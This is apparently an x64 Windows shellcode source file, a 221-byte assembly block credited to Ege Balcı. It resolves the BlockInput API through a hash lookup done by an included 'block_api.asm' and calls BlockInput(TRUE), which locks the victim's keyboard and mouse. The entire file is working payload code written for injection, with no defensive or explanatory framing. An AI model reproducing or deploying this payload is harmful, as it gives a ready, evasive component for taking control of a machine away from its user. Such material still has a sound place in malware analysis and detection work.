; Block Input
; Author: Ege Balcı
; Size: 221 bytes 
;


[BITS 64]
[ORG 0]
 
	cld                         ; Clear direction flags
	call start                  ;
	%include "../block_api.asm" ; block_api.asm
start:
	pop rbp                     ; Pop the address of block api 
	mov r10d,0x60329411         ; hash(kernel32.dll, BlockInput())
	mov rcx,qword 0x1           ; TRUE
	call rbp                    ; BlockInput(TRUE)
	ret                         ; <-
